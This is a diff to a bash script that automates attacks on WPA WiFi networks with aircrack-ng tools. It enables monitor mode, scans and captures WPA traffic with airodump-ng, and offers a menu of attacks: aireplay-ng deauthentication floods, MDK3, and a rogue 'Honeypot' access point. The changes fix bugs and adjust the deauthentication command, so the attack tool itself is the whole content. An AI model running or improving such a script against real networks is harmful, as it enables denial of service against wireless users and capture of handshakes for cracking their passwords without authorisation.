@@ -41,7 +41,7 @@ killall -q xterm ifconfig dhcpcd dhclient dhclient3 NetworkManager wpa_supplican
 pids=`ps -A | grep -e xterm -e ifconfig -e dhcpcd -e dhclient -e NetworkManager -e wpa_supplicant -e udhcpc`
 done
 stop_monitor
-mv Networks/"$essid ($split_bssid)"-*.cap ./
+mv Networks/"$essid ($split_bssid)"-*.cap ./ > /dev/null 2>&1
 rm -fr ./Networks > /dev/null 2>&1
 mkdir Networks > /dev/null 2>&1
 }
@@ -105,7 +105,8 @@ iwconfig $iface_str rate 1M > /dev/null 2>&1
 
 monitor_mode(){ 
 airmon-ng start $iface_str > /dev/null 2>&1
-iface_str=$iface_str"mon"
+#iface_str=$iface_str"mon"
+iface_str="mon0"
 ifconfig $iface_str > /dev/null 2>&1
 echo -e $magenta"\n ------------------------------------------------------------"
 echo -e $green"           Activating "$yellow""$iface_str""$green" monitor mode"
@@ -117,7 +118,7 @@ scan_aps(){
 echo -e $green "  Scanning ..."$red" [[ Ctrl + C to stop ]]"
 echo -e $magenta" ------------------------------------------------------------\n"
 sleep 2
-xterm -e airodump-ng --encrypt WPA -w ./Networks/networks $iface_str 
+xterm -e airodump-ng --encrypt WPA -w ./Networks/networks $iface_str
 ap_lines=`cat Networks/networks-01.csv | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
 let ap_lines=$ap_lines-1
 echo -e "ap_lines = "$ap_lines
@@ -353,7 +354,7 @@ while [ $c -le $howmany ]; do
 thereis=`echo $v | awk '{print $'$c'}'`
 client_mac=`echo -n $thereis | cut -c-8`
 echo -en $green"\r Deauthenticating client "$yellow"$thereis... \033[K"
-xterm -e aireplay-ng -R --ignore-negative-one -0 5 -a $bssid -c $thereis $iface_str
+xterm -e aireplay-ng -0 5 -a $bssid $iface_str
 c=$((c+1))
 done
 c=$interval
@@ -502,7 +503,7 @@ echo -en $green"\r Launching Honeypot... \033[K""$green"
 c=$((c+1))
 done
 c=$interval
-while [ $Cc -ge 1 ]; do
+while [ $c -ge 1 ]; do
 calc
 data=`cat ./Networks/"$essid ($split_bssid)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
 if [[ $data -ne 0 ]]; then
@@ -581,9 +582,9 @@ select_ap
 echo -e $magenta "\n--------------------------------------------------\n"
 echo -e $yellow" Attack types. \n\n"
 echo -e $blue" 1) Aireplay-ng"
-echo " 2) MDK3\n"
-echo " 3) Honeypot\n"
-echo " 4) Honeypot + Aireplay-ng\n"
+echo " 2) MDK3"
+echo " 3) Honeypot"
+echo " 4) Honeypot + Aireplay-ng"
 echo -e " 5) Honeypot + MDK3\n"$yellow"\n"
 read -p " Select attack : " attack
 
